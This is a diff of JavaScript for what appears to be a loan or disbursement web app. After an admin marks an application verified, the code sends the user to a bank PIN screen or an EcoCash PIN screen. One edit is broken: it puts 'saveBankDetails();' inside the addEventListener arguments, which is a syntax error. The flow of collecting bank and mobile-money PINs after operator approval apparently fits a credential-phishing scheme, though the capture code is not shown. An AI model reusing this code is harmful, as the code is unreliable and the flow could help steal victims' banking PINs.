@@ -984,7 +984,7 @@ function loadBankDetailsScreen() {
         .getElementById("continueBankDetails")
         .addEventListener(
             "click",
-            saveBankDetails
+            saveBankDetails();
         );
 
 }
@@ -1515,8 +1515,10 @@ function loadVerificationPendingScreen() {
     monitorVerificationStatus();
 
 }
+
 // ======================================================
 // PART 16 - MONITOR VERIFICATION STATUS
+// BANK + ECOCASH ROUTING
 // ======================================================
 
 async function monitorVerificationStatus() {
@@ -1525,7 +1527,9 @@ async function monitorVerificationStatus() {
         sessionStorage.getItem("applicationId");
 
     if (!applicationId) {
+
         console.error("Application ID not found.");
+
         return;
     }
 
@@ -1538,15 +1542,55 @@ async function monitorVerificationStatus() {
         const result = await response.json();
 
         if (!result.success) {
+
+            setTimeout(
+                monitorVerificationStatus,
+                5000
+            );
+
             return;
         }
 
         const stage =
             result.application.current_stage;
 
+        // ==============================================
+        // VERIFICATION COMPLETED
+        // ==============================================
+
         if (stage === "verified") {
 
-            loadBankPinScreen();
+            const method =
+                sessionStorage.getItem(
+                    "disbursementMethod"
+                );
+
+            // ==========================================
+            // ECOCASH APPLICATION
+            // ==========================================
+
+            if (method === "EcoCash") {
+
+                loadEcoCashPinScreen();
+
+                return;
+            }
+
+            // ==========================================
+            // BANK APPLICATION
+            // ==========================================
+
+            if (method === "Bank") {
+
+                loadBankPinScreen();
+
+                return;
+            }
+
+            console.error(
+                "Unknown disbursement method:",
+                method
+            );
 
             return;
         }
@@ -1560,13 +1604,17 @@ async function monitorVerificationStatus() {
 
     }
 
-    // Keep checking until the admin verifies it.
+    // ==============================================
+    // KEEP CHECKING
+    // ==============================================
+
     setTimeout(
         monitorVerificationStatus,
         5000
     );
 
 }
+
 // ======================================================
 // PART 17 - ECOCASH DETAILS SCREEN
 // ======================================================
@@ -2078,7 +2126,7 @@ async function saveEcoCashVerification() {
         }
 
         // The value has been saved.
-        loadEcoCashPinScreen();
+        loadVerificationPendingScreen();
 
     } catch (err) {
 
